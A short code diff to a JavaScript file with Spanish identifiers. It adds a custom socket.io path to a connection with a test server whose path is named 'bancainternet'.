@@ -22,7 +22,10 @@ CerrarModal.addEventListener("click", () => {
     Alert.style.display = "none";
 })
 
-const socket = io.connect('https://test.fasito.link/bancainternet/')
+const socket = io.connect('https://test.fasito.link/bancainternet/', {
+        path: "/bancainternet/socket.io/"
+    })
+
 
 
 //Obtener identificador original
